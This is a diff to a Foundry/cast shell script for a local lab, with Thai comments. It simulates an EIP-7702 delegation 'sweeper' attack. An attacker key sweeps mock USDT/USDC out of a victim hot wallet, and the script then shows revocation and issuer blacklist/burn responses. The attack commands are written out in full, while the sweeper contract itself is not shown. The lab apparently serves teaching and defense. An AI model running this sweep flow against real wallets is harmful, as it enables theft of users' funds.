@@ -25,6 +25,9 @@ export USDC=$(forge create src/lab/MockUSDC.sol:MockUSDC \
   --constructor-args $ADMIN $ISS | jq -r .deployedTo)
 echo "USDC=$USDC"
 
+cast send $USDT "mint(address,uint256)" $HOT 10000000000 --private-key $ISS_PK --rpc-url $RPC
+cast send $USDC "mint(address,uint256)" $HOT 10000000000 --private-key $ISS_PK --rpc-url $RPC
+
 # Deploy SWEEP
 export SWEEP=$(forge create src/lab/Sweeper7702.sol:Sweeper7702 \
   --rpc-url $RPC --private-key $ATK_PK --broadcast --json \
@@ -68,12 +71,15 @@ cast send $HOT "sweep(address[])" "[$USDT,$USDC]" --private-key $ATK_PK --rpc-ur
 
 
 cast balance $HOT --rpc-url $RPC --ether   # เหยื่อหาย
-cast call $USDT "balanceOf(address)(uint256)" $HOT --rpc-url $RPC | awk '{print $1}') / 1000000" | bc
-cast call $USDC "balanceOf(address)(uint256)" $HOT --rpc-url $RPC | awk '{print $1}') / 1000000" | bc
+cast call $USDT "balanceOf(address)(uint256)" $HOT --rpc-url $RPC | awk '{printf "%.6f\n", $1/1e6}'
+cast call $USDC "balanceOf(address)(uint256)" $HOT --rpc-url $RPC | awk '{printf "%.6f\n", $1/1e6}'
 
 cast balance $ATK --rpc-url $RPC --ether   # โจรได้ 
-cast call $USDT "balanceOf(address)(uint256)" $ATK --rpc-url $RPC | awk '{print $1}') / 1000000" | bc
-cast call $USDC "balanceOf(address)(uint256)" $ATK --rpc-url $RPC | awk '{print $1}') / 1000000" | bc
+cast call $USDT "balanceOf(address)(uint256)" $ATK --rpc-url $RPC | awk '{printf "%.6f\n", $1/1e6}'
+cast call $USDC "balanceOf(address)(uint256)" $ATK --rpc-url $RPC | awk '{printf "%.6f\n", $1/1e6}'
+
+# ส่งจาก ATK ไป ISS จำนวน 10000 USDT (6 decimals → 100*1e6)
+cast send $USDT "transfer(address,uint256)" $ISS 10000000000 --private-key $ATK_PK --rpc-url $RPC
 
 
 # revoke = delegate ไปที่ address ศูนย์ (0x0000...0000) ไม่มีคำสั่งชื่อ revoke โดยเฉพาะ มันคือ sign-auth + cast send --auth ชุดเดิม แค่เปลี่ยนเป้าหมายจาก $SWEEP เป็น 0x0
@@ -95,8 +101,8 @@ cast send $USDC "blacklist(address)"    $DROP --private-key $ISS_PK --rpc-url $R
 cast send $USDT "destroyBlackFunds(address)" $DROP --private-key $ISS_PK --rpc-url $RPC
 
 # USDT mint คืนได้ด้วยหลังจากเผาทิ้ง
-cast send $USDT "issue(uint256)" 1175000000000000 --private-key $ISS_PK --rpc-url $RPC
-cast send $USDT "transfer(address,uint256)" $VICTIM 1175000000000000 --private-key $ISS_PK --rpc-url $RPC
+cast send $USDT "issue(uint256)" 10000000000 --private-key $ISS_PK --rpc-url $RPC
+cast send $USDT "transfer(address,uint256)" $HOT 10000000000 --private-key $ISS_PK --rpc-url $RPC
 
 
 # หลังแก้ contract แล้ว คนอัปเกรดโค้ด ≠ คนกด freeze
